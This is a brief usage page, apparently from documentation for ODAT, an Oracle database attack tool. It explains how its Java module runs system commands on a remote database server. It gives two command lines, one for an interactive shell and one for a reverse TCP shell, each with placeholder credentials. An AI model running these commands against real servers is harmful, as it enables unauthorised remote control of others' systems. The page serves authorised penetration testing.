# Get a remote shell

This module can be used to execute system commands on a remote database server. Useful to get a __shell__ or a __reverse tcp shell__.

* To get a *shell* on the database server:
```bash
./odat.py java -s $SERVER -d $SID -U $USER -P $PASSWORD --shell
```

* To get a reverse tcp shell:
```bash
./odat.py java -s $SERVER -d $SID -U $USER -P $PASSWORD --reverse-shell
```